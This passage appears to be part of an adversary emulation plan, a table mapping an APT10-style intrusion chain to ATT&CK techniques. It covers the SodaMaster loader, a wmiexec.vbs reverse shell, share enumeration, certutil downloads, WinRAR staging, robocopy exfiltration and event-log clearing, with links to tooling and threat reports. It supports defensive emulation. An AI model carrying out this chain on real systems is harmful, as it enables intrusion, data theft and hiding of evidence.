   | SodaMaster downloads WMIexec.vbs | [ExecShellcode](../Resources/SodaMaster/SodaMaster-DLL/Core.cpp#L196) | T1105 Ingress Tool Transfer | [JSAC-jpcert](http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf) |
   | WMIexec.vbs creates a remote WMI connection to the file server | [wmiexec.vbs](https://github.com/Twi1ight/AD-Pentest-Script/blob/master/wmiexec.vbs) | T1047 Windows Management Instrumentation | [pwc](https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-technical-annex-april-2017.pdf#page=24) |
   | WMIexec.vbs establishes reverse shell | [wmiexec.vbs](https://github.com/Twi1ight/AD-Pentest-Script/blob/master/wmiexec.vbs) | T1059.003 Command and Scripting Interpreter: Windows Command Shell | [pwc](https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-technical-annex-april-2017.pdf#page=24) |
   | Reverse shell executes PowerShell | [wmiexec.vbs](https://github.com/Twi1ight/AD-Pentest-Script/blob/master/wmiexec.vbs) | T1059.001 Command and Scripting Interpreter: PowerShell | [pwc](https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-technical-annex-april-2017.pdf#page=24) |
   | Reverse shell uses PowerShell to enumerate file shares | [wmiexec.vbs](https://github.com/Twi1ight/AD-Pentest-Script/blob/master/wmiexec.vbs) | T1135 Network Share Discovery | [pwc](https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-technical-annex-april-2017.pdf#page=24) |
   | Reverse shell uses PowerShell to enumerate files on discovered file shares | [wmiexec.vbs](https://github.com/Twi1ight/AD-Pentest-Script/blob/master/wmiexec.vbs) | T1039 Data from Network Shared Drive | [pwc](https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-technical-annex-april-2017.pdf#page=24) |
   | certutil.exe downloads WinRAR.exe | - | T1105 Ingress Tool Transfer | [Symantec](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage) |
   | WinRAR.exe compresses files of interest | - | T1560.001 Archive Collected Data: Archive via Utility | [pwc](https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-technical-annex-april-2017.pdf#page=27) |
   | robocopy exfiltrates compressed files to adversary SMB share | - | T1039 Data from Network Shared Drive | [pwc](https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-report-april-2017.pdf) |
   | List and clear all Windows event logs | - | T1070.001 Indicator Removal: Clear Windows Event Logs | [JSAC-jpcert](https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf) |

 </details>

<br>
